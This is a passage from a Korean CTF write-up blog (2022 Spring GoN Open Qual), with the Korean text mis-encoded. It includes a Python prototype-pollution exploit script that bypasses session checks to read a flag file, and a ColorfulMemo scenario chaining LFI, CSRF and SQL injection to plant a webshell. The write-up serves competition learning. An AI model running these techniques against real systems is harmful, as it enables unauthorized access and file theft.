ìœ„í•´ ë§Œë“¤ì–´ì•¼ í•  ê°’ì€ ì•„ë˜ì™€ ê°™ë‹¤.</p><ul><li><code class="language-plaintext highlighter-rouge">{}.__proto__.workspace = "asdf"</code> -&gt; <code class="language-plaintext highlighter-rouge">users[__proto__].workspaces</code>ê°€ <code class="language-plaintext highlighter-rouge">undefined</code>ê°€ ë˜ì§€ ì•Šë„ë¡<li><code class="language-plaintext highlighter-rouge">{}.__proto__.asdf = "flag"</code> -&gt; <code class="language-plaintext highlighter-rouge">user[__proto__].workspaces[__proto__][f_name]</code>ì´ <code class="language-plaintext highlighter-rouge">flag</code>ë¥¼ ë°˜í™˜í•˜ë„ë¡<li><code class="language-plaintext highlighter-rouge">{}.__proto__.base_dir = "/usr/src/app"</code> -&gt; <code class="language-plaintext highlighter-rouge">user[__proto__].base_dir</code>ì´ <code class="language-plaintext highlighter-rouge">/usr/src/app</code>ì„ ë°˜í™˜í•˜ë„ë¡</ul><p>ê·¸ëŸ°ë° ì½”ë“œë¥¼ ì¡°ê¸ˆ ë” ì‚´í´ë³´ë©´ ë¬¸ì œê°€ ìˆë‹¤.<br /> 9ë²ˆì§¸ ì¤„ì˜ ë¶„ê¸°ë¥¼ í†µê³¼í•˜ëŠ” tokenì„ ë§Œë“¤ì–´ì•¼ í•œë‹¤.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">check_session</code> í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">sess</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">[</span><span class="nx">token</span><span class="p">]</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">sess</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">sess</span><span class="p">.</span><span class="nx">owner</span> <span class="o">!=</span> <span class="nx">userid</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">sess</span><span class="p">.</span><span class="nx">expire</span> <span class="o">&lt;</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">){</span>
        <span class="nx">tokens</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>í•´ë‹¹ í•¨ìˆ˜ ë˜í•œ PPë¥¼ ì´ìš©í•´ì„œ í†µê³¼í•˜ê¸° ìœ„í•´ tokenì„ <code class="language-plaintext highlighter-rouge">__proto__</code>ë¡œ ì¤¬ì„ ë•Œì˜ í•„ìš”í•œ ì¡°ê±´ì„ ìƒê°í•˜ì˜€ë‹¤.</p><ol><li><code class="language-plaintext highlighter-rouge">tokens[__proto__].owner</code>ê°€ <code class="language-plaintext highlighter-rouge">__proto__</code>ë¥¼ ë°˜í™˜<li><code class="language-plaintext highlighter-rouge">tokens[__proto__].owner</code>ê°€ ë§¤ìš° í° ì •ìˆ˜ë¥¼ ë°˜í™˜</ol><p>ìœ„ ë‘ ì¡°ê±´ì„ ë§Œì¡±í•˜ë©´ í†µê³¼í•  ìˆ˜ ìˆëŠ”ë°<br /> 1ë²ˆ ì¡°ê±´ì€ <code class="language-plaintext highlighter-rouge">{}.__proto__.owner = "__proto__"</code>ë¥¼ ì¤˜ì„œ ì‰½ê²Œ ë„˜ì–´ê°ˆ ìˆ˜ ìˆë‹¤.</p><p>2ë²ˆ ì¡°ê±´ì€ <code class="language-plaintext highlighter-rouge">{digit ë¬¸ìì—´} &lt; {ì •ìˆ˜}</code> ì‹ì´ <code class="language-plaintext highlighter-rouge">{ì •ìˆ˜} &lt; {ì •ìˆ˜}</code>ë¡œ ì¸ì‹ë˜ëŠ” ì ì„ ì´ìš©í•´ì„œ<br /> <code class="language-plaintext highlighter-rouge">{}.__proto__.expire = "999999999999999"</code>ë¥¼ ì¤˜ì„œ ë„˜ì–´ê°ˆ ìˆ˜ ìˆë‹¤.</p><p>ìœ„ì˜ PPë¥¼ ëª¨ë‘ ë§Œë“¤ê³  íŒŒì¼ì„ ë¶€ë¥´ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://host2.dreamhack.games:12391/api"</span>
<span class="c1"># URL = "http://localhost:8888/api"
</span>
<span class="n">proto_user</span> <span class="o">=</span> <span class="s">"__proto__"</span>
<span class="n">user</span> <span class="o">=</span> <span class="s">"qqq"</span>
<span class="n">pw</span> <span class="o">=</span> <span class="s">"asdfasdfasdf"</span>
<span class="n">ws</span> <span class="o">=</span> <span class="s">"__proto__"</span>

<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">"/users"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"pass"</span><span class="p">:</span><span class="n">pw</span><span class="p">}).</span><span class="n">json</span><span class="p">())</span>
<span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">"/users/auth"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"pass"</span><span class="p">:</span><span class="n">pw</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">c</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>

<span class="c1">### users[qqq].workspaces["__proto__"].expire = "99999999999999999999999999"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"expire"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"99999999999999999999999999"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span> 
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### users[qqq].workspaces["__proto__"].owner = "__proto__"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"owner"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"__proto__"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### users[qqq].workspaces["__proto__"].workspaces = "asdfasdfasdf"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"workspaces"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"asdfasdfasdf"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### users[qqq].workspaces["__proto__"].zzzzzz = "flag"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"zzzzzz"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"flag"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### users[qqq].workspaces["__proto__"].base_dir = "/usr/src/app"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"base_dir"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"/usr/src/app"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### get(users.__proto__.base_dir + users.__proto__.workspaces.__proto__.zzzzzz)
### == get("/usr/src/app/flag")
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">"/users/__proto__/__proto__/zzzzzz"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="s">'__proto__'</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="s">'__proto__'</span><span class="p">,</span><span class="s">"ws_name"</span><span class="p">:</span><span class="s">"123"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">c</span><span class="p">[</span><span class="s">'file_content'</span><span class="p">]).</span><span class="n">decode</span><span class="p">())</span>
</pre></table></code></div></div><h2 id="r-billionaire---blockchain">R. billionaire - Blockchain<a href="#r-billionaire---blockchain" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Contractë¥¼ ë°°í¬í•˜ëŠ” íŠ¸ëœì ì…˜ì˜ ë””í…Œì¼ í˜ì´ì§€ì— ë“¤ì–´ê°€ë©´, í”Œë˜ê·¸ ë°ì´í„°ê°€ ë‹´ê¸´ storageë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p>íœ™ë“í•œ ë°ì´í„°ë¥¼ solidity ì½”ë“œì— ë§ê²Œ xorí•´ì£¼ë©´ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆë‹¤.</p><h2 id="t-legendary---crypto">T. Legendary - Crypto<a href="#t-legendary---crypto" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Legendre PRF ë¬¸ì œì´ë‹¤.</p><p>ì–´ëŠ ê¹ƒí—ˆë¸Œ <a href="https://github.com/cryptolu/LegendrePRF">ë ˆí¬ì§€í† ë¦¬</a>ì— ì´ë”ë¦¬ì›€ ë°”ìš´í‹°ê°€ ê±¸ë¦° Legendre PRFë¥¼ í’€ê¸° ìœ„í•œ ì†”ë¸Œ ì½”ë“œê°€ ì‘ì„±ë˜ì–´ ìˆì—ˆë‹¤.</p><p>í•´ë‹¹ ë ˆí¬ì˜ <code class="language-plaintext highlighter-rouge">solve.cpp</code>ë¥¼ ì£¼ì–´ì§„ ë¬¸ì œì— ë§ê²Œ ì ë‹¹íˆ ìˆ˜ì •í•˜ì—¬ ì»´íŒŒì¼ í•œ í›„ ì‹¤í–‰í•˜ë©´ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆì—ˆë‹¤.</p><h2 id="u-legendary---revenge---crypto">U. Legendary - Revenge - Crypto<a href="#u-legendary---revenge---crypto" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="#t-legendary---crypto">T</a>ì—ì„œ <code class="language-plaintext highlighter-rouge">prime</code>ì˜ ë¹„íŠ¸ ìˆ˜ê°€ ë§ì•„ì§€ê³ , outputì´ ì¤„ì–´ë“¤ì—ˆë‹¤.</p><p>ë•Œë¬¸ì—, ë™ì¼í•œ ë°©ë²•ìœ¼ë¡œ í’€ì´ë¥¼ í•˜ë ¤ê³  ì‹œë„í–ˆë‹¤.</p><p>í•˜ì§€ë§Œ ë§ì€ ë©”ëª¨ë¦¬ê°€ í•„ìš”í•´ì„œ vmí™˜ê²½ì—ì„œëŠ” ì‹¤í–‰í•  ìˆ˜ ì—†ëŠ”ë°<br /> ì–´ë– í•œ ì›ì¸ì—ì„œì¸ì§€ Host OS í™˜ê²½ì—ì„œëŠ” ì œëŒ€ë¡œ ì‹¤í–‰ì´ ë˜ì§€ ì•Šì•„ì„œ<br /> ì„œë²„ í˜¸ìŠ¤íŒ…ì„ í•˜ëŠ” ì¹œêµ¬ì˜ ë‚¨ëŠ” ìì›ì„ ë¹Œë ¤ì„œ 32ì½”ì–´, 32GBì˜ ë¨ì„ ê°€ì§„ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ë°›ì•˜ë‹¤.</p><p>16ìŠ¤ë ˆë“œë¡œë¥¼ ì£¼ê³  10ë¶„ê°„ ëŒë¦° ê²°ê³¼ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆì—ˆë‹¤.</p><p>í’€ê³ ë‚œ ì§í›„ì—ëŠ” ë„ˆë¬´ ë§ì€ ì»´í“¨íŒ… íŒŒì›Œê°€ í•„ìš”í•œê²Œ ì•„ë‹Œê°€ ì‹¶ì—ˆì§€ë§Œ<br /> ì¡°ê¸ˆ ìƒê°í•´ë³´ë‹ˆê¹Œ ì•„ë¬´ë˜ë„ ë‚´ í’€ì´ê°€ ì˜ë„ë˜ì§€ ì•Šì€ ìì› ë°•ì¹˜ê¸°ì¸ ê²ƒ ê°™ì•˜ë‹¤.<br /> ì˜ë„ë˜ì§„ ì•Šì•˜ë”ë¼ë„ ì½”ë“œë¥¼ ë³´ê³  ë¶„ì„í•´ì„œ ìˆ˜ì •í–ˆë‹¤ë©´ ì¡°ê¸ˆ ë” ì ì€ ìì›ìœ¼ë¡œë„ í’€ ìˆ˜ ìˆì§€ ì•Šì•˜ì„ê¹Œí•˜ëŠ” ìƒê°ì´ ë“ ë‹¤.</p><h2 id="v-colorfulmemo---web">V. ColorfulMemo - Web<a href="#v-colorfulmemo---web" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>í•´ë‹¹ ë¬¸ì œëŠ” 3ê°œì˜ ì›¹ ì·¨ì•½ì ì„ ì—°ê³„í•´ì„œ ì›¹ì‰˜ì„ ë§Œë“œëŠ” ì»¨ì…‰ì˜ ë¬¸ì œì˜€ë‹¤.<br /> ì‚¬ìš©ëœ ì·¨ì•½ì ì€ <code class="language-plaintext highlighter-rouge">LFI</code>, <code class="language-plaintext highlighter-rouge">CSRF</code>, <code class="language-plaintext highlighter-rouge">SQLi</code>ì´ë‹¤.</p><p>ìš°ì„  <code class="language-plaintext highlighter-rouge">index.php</code>ë¥¼ ë³´ë©´</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"path"</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$path</span> <span class="o">==</span> <span class="s2">""</span><span class="p">){</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"main"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"./"</span><span class="mf">.</span><span class="nv">$path</span><span class="mf">.</span><span class="s2">".php"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
...(ì¤‘ëµ)...
<span class="cp">&lt;?php</span> <span class="k">include_once</span> <span class="nv">$path</span><span class="p">;</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><p>ìœ„ì™€ ê°™ì€ GET íŒŒë¼ë¯¸í„°ë¡œ ë‚ ì•„ì˜¨ <code class="language-plaintext highlighter-rouge">path</code>ê°’ì— ì•„ë¬´ëŸ° ê²€ì¦ ì—†ì´ <code class="language-plaintext highlighter-rouge">./</code>ì™€ <code class="language-plaintext highlighter-rouge">.php</code>ë¥¼ ë¶™ì—¬ì„œ includeë¥¼ í•´ì¤€ë‹¤. ë”°ë¼ì„œ ìœ„ ë¶€ë¶„ì—ì„œ LFIê°€ ë°œìƒí•œë‹¤.</p><p>ê¸€ì„ writeí•  ë•Œ, <code class="language-plaintext highlighter-rouge">style</code> íƒœê·¸ì— í° ì œì•½ ì—†ì´ ì•„ë¬´ê±°ë‚˜ ì“¸ ìˆ˜ ìˆë‹¤.<br /> ì´ë•Œ <code class="language-plaintext highlighter-rouge">black;background-image:URL(URL)</code>ë°©ì‹ìœ¼ë¡œ csrfë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆê²Œ ëœë‹¤.</p><p>ë˜, <code class="language-plaintext highlighter-rouge">check.php</code>ë¥¼ ì‚´í´ë³´ë©´</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'127.0.0.1'</span> <span class="o">||</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'::1'</span><span class="p">){</span>
    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
    <span class="nv">$mysqli</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span><span class="s1">'user'</span><span class="p">,</span><span class="s1">'password'</span><span class="p">,</span><span class="s1">'colorfulmemo'</span><span class="p">);</span>
    <span class="c1">// I believe admin</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s1">'SELECT adminCheck FROM memo WHERE id = '</span><span class="mf">.</span><span class="nv">$id</span><span class="p">);</span>

<span class="mf">...</span><span class="p">(</span><span class="n">í›„ëµ</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>ë§Œì•½ í´ë¼ì´ì–¸íŠ¸ì˜ ì£¼ì†Œê°€ ë¡œì»¬ í˜¸ìŠ¤íŠ¸ì¸ ê²½ìš°ì—<br /> GET íŒŒë¼ë¯¸í„°ë¡œ ë‚ ë¦¬ëŠ” <code class="language-plaintext highlighter-rouge">id</code>ë¥¼ ì´ìš©í•´ì„œ SQL injectionì´ ê°€ëŠ¥í•˜ë‹¤.</p><p>ê·¸ëŸ°ë° <code class="language-plaintext highlighter-rouge">my.cnf</code>íŒŒì¼ì— <code class="language-plaintext highlighter-rouge">secure-file-priv= /tmp/</code>ê°€ ìˆìœ¼ë¯€ë¡œ<br /> <code class="language-plaintext highlighter-rouge">/tmp</code> ë””ë ‰í† ë¦¬ì— íŒŒì¼ì„ ì½ê³  ì“¸ìˆ˜ ìˆë‹¤.</p><p>ê·¸ë˜ì„œ ìƒê°í•œ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><ol><li>writeí•  ë•Œ colorì— <code class="language-plaintext highlighter-rouge">black;background-image:URL("/?path=check.php&amp;id={ì ì ˆí•œ /tmp/asdf.php ì›¹ì‰˜ ì—…ë¡œë“œ êµ¬ë¬¸}")</code>ì„ ì¤€ë‹¤.\<li>ê·¸ë¦¬ê³  í•´ë‹¹ ê¸€ì„ ë¦¬í¬íŠ¸í•˜ë©´ CSRF -&gt; SQLiê°€ ë°œìƒí•´ì„œ <code class="language-plaintext highlighter-rouge">/tmp/asdf.php</code>ì— ì›¹ì‰˜ì´ ë§Œë“¤ì–´ì§„ë‹¤.\<li><code class="language-plaintext highlighter-rouge">/?path=../../../tmp/asdf.php</code>ì— ì ‘ì†í•œë‹¤.</ol><p>ìœ„ ì‹œë‚˜ë¦¬ì˜¤ëŒ€ë¡œ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆì—ˆë‹¤.</p><h2 id="í›„ê¸°">í›„ê¸°<a href="#í›„ê¸°" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>ì‘ë…„ FIESTA ì´í›„ë¡œ ëŒ€íšŒ ì‹œê°„ì´ ê¸´ CTFëŠ” ê½¤ ê°„ë§Œì— í•˜ëŠ” ê²ƒ ê°™ì•˜ë‹¤.<br /> ê¸´ CTFë¥¼ í•˜ë©´ ì‹œê°„ì„ ë§ì´ ë°•ì•„ë„ ë¶€ë‹´ì´ ì—†ì–´ì„œ ì¢‹ì§€ë§Œ<br /> ìˆœìœ„ ìœ ì§€ì— ê·¸ë§Œí¼ ì‹œê°„ì´ ë” ë“¤ì–´ì„œ í˜ì´ ë“œëŠ” ê²ƒ ê°™ë‹¤.</p><p>ëª¨ìª¼ë¡¬ ë§ì´ ì–»ì–´ê°€ê³  ì¬ë¯¸ìˆê²Œ í–ˆë˜ CTFì˜€ë‹¤.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/gon/" class="post-tag no-text-decoration" >GoN</a> <a href="/tags/dreamhack/" class="post-tag no-text-decoration" >Dreamhack</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=2022 Spring GoN Open Qual Writeup - G0RiyA&url=https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=2022 Spring GoN Open Qual Writeup - G0RiyA&u=https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=2022 Spring GoN Open Qual Writeup - G0RiyA&url=https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/2022-Spring-GoN-Open-Qual-Writeup/">2022 Spring GoN Open Qual Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dreamhack/">Dreamhack</a> <a class="post-tag" href="/tags/gon/">GoN</a> <a class="post-tag" href="/tags/writeup/">writeup</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div><script src="https://utteranc.es/client.js" repo="G0RiyA/G0RiyA.github.io" issue-term="pathname" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to 